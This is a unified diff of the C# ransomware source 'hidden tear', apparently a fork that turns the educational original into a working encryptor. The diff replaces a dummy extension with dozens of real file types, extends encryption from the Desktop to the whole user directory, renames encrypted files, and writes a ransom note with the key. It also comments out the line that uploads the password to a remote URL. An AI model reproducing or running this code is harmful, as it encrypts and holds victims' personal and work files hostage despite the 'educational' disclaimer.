@@ -1,4 +1,4 @@
-﻿/*
+/*
  _     _     _     _              _                  
 | |   (_)   | |   | |            | |                 
 | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
@@ -6,20 +6,11 @@
 | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
 |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
  
- * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
+ * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com | Recoded by charlybs
  * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
  * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
  * 
- * Ve durdu saatler 
- * Susuyor seni zaman
- * Sesin dondu kulagimda
- * Dedi uykudan uyan
  * 
- * Yine boyle bir aksamdi
- * Sen guluyordun ya gozlerimin icine
- * Feslegenler boy vermisti
- * Gokten parlak bir yildiz dustu pesine
- * Sakladim gozyaslarimi
  */
 
 using System;
@@ -51,9 +42,9 @@ namespace hidden_tear
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
+        
 
-
-
+        
         public Form1()
         {
             InitializeComponent();
@@ -127,7 +118,7 @@ namespace hidden_tear
                 values["computerName"] = computerName;
                 values["userName"] = userName;
                 values["password"] = password;
-                client.UploadValues(targetURL, "POST", values);
+                //client.UploadValues(targetURL, "POST", values);
                 //Console.WriteLine(Encoding.Default.GetString(client.UploadValues(targetURL, "POST", values)));
             }
         }
@@ -146,59 +137,73 @@ namespace hidden_tear
                 byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
                 File.WriteAllBytes(file, bytesEncrypted);
-                System.IO.File.Move(file, file + ".locked");
+                System.IO.File.Move(file, file + "._x_");
             }
             catch (Exception exception)
             {
                 //OutOfMemoryException
             }
             
-            
         }
 
         //encrypts target directory
         public void encryptDirectory(string location, string password)
         {
-            
+
             //extensions to be encrypt
             var validExtensions = new[]
             {
-                ".kakakaka"
+                ".JPG", ".jpg", ".jpeg", ".JPEG", ".GIF", ".gif", ".mp3", ".m4a", ".MP3", ".wav", ".pdf", ".exe", ".EXE", ".RAW", ".bat", ".json", ".JSON",
+                ".PDF", ".doc", ".DOC", ".txt", ".TXT", ".png", ".PNG", ".cs", ".c", ".java", ".h", ".DOCX", ".dll", ".DLL", ".rar", ".zip", ".7zip", ".raw",
+                ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
             };
+          
+            
+
 
             string[] files = Directory.GetFiles(location);
             string[] childDirectories = Directory.GetDirectories(location);
-            for (int i = 0; i < files.Length; i++){
-                string extension = Path.GetExtension(files[i]);
-                if (validExtensions.Contains(extension))
+
+            if (!location.Contains("\\AppData\\")) {
+                for (int i = 0; i < files.Length; i++)
                 {
-                    EncryptFile(files[i],password);
+
+                    string extension = Path.GetExtension(files[i]);
+                    if (validExtensions.Contains(extension) && extension != "_x_")
+                    {
+                        if (!files[i].Contains("hidden-tear-decrypter.exe") && !files[i].Contains("READ_IT.txt")) {
+                            EncryptFile(files[i], password);
+                        }
+                    }
+                }
+                for (int i = 0; i < childDirectories.Length; i++)
+                {
+                    encryptDirectory(childDirectories[i], password);
                 }
             }
-            for (int i = 0; i < childDirectories.Length; i++){
-                encryptDirectory(childDirectories[i],password);
-            }
-            
             
         }
 
         public void startAction()
         {
             string password = CreatePassword(255);
-            string path = "\\Desktop\\";
+            string path = "\\";
             string startPath = userDir + userName + path;
             SendPassword(password);
             encryptDirectory(startPath,password);
-            messageCreator();
+            if (!System.IO.File.Exists(startPath+"Desktop\\READ_IT.txt")) {
+                messageCreator(password);
+            }
             password = null;
             System.Windows.Forms.Application.Exit();
         }
 
-        public void messageCreator()
+        public void messageCreator(string psswd)
         {
-            string path = "\\Desktop\\READ_IT_"+ DateTime.Now.ToString("h_mm_ss_tt") + ".txt"; 
+            string path = "\\Desktop\\READ_IT.txt"; 
             string fullpath = userDir + userName + path;
-            string[] lines = { "Files has been encrypted with hidden tear", "Run 'HTDecrypter.exe' for decrypt all files."};
+            string[] lines = { "Files has been encrypted with hidden tear", "Run 'hidden-tear-decrypter.exe' for decrypt all files.", "PASSWORD: "+psswd};
+            System.IO.File.Delete(@fullpath);
             System.IO.File.WriteAllLines(fullpath, lines);
         }
     }
